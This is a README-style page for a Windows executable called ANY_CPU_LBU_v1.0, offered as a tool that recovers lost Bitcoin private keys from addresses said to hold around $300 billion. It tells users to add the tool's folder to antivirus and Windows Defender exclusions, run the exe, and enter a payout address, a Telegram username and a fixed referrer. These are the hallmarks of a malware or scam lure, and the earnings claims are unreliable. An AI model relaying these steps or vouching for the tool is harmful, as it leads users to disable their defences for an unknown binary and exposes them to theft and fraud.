# ANY_CPU_LBU_v1.0
Lost keys from bitcoin addresses finder by Any CPU Lost Bitcoin Unlocker
Welcome, Stalker!
...
All these addresses are baked into the ANY_CPU_LBU_v1.0.exe tool and collectively hold around $300 billion.
...
1. Open the `ANY_CPU_LBU_v1.0` folder and locate `ANY_CPU_LBU_v1.0.exe` inside.
...
3. Add the `ANY_CPU_LBU_v1.0` folder to your antivirus whitelist and to Windows Defender exclusions 
...
Choose ANY_CPU_LBU_v1.0 folder`).

`ANY_CPU_LBU_v1.0` works with ANY CPUs with multi cpu supporting.
...
Double-click `ANY_CPU_LBU_v1.0.exe`. In the program window, You will see:
(example)
==================== Available CPU(s) =====================
ID:     0
...
It shows the CPU(s) in your system.
...
4) From the CPUs list enter the number of CPUs to use(Program will accept quantity counting from top to bottom of list):
**Quantity of CPUs: (e.g., 2)

5) **Your BTC Address for payout: (e.g., 1bcfybub5n5k3455n34j5nnn77d78 - your own address for receive reward)

6) **Your Telegram username (without @): (e.g., JohnTompson - for contact and stalkers group notification in case of finding key)

7) **Your Referrer Telegram username (without @): (e.g., Nick23, it can't be changed)

8) **Enter parameters for every CPU? [y/N] (e.g., Y - you will able to enter own unique parameters for every CPU, otherwise global configuration will be used for all CPUs)
Example:
----------------------------------------------------------------------------------------------------------------------------------
Using CPUs: 0..1
Enter CPU id (empty for exit): 0
=== Overrides for CPU 0 ===
...
Enter CPU id (empty for exit):
----------------------------------------------------------------------------------------------------------------------------------

9) **Save entered parameters to config file? [Y/n] y
[OK] Config saved in: ...\ANY_CPU_LBU\config.json (on following program using you will able to use saved config on start)
...
ANY_CPU_LBU_v1.0 first check if selected range in Grey Zone, if not - it try to scan it for a key.
...
It holds your Working Hours safe in curve even when your ANY_CPU_LBU_v1.0 is offline.
...
`START: 2832ed74f1b5e25ee END: 2832ed75f3b5e45ee`

Or you can make your own test.
Generate btc legacy compressed address here: https://secretscan.org/PrivateKeyHex
Put it in the end of ..\ANY_CPU_LBU_v1.0\bin\points.dev (open with text editor and save)
...
Run the test ANY_CPU_LBU_v1.0 with this ranges in Linear mode.
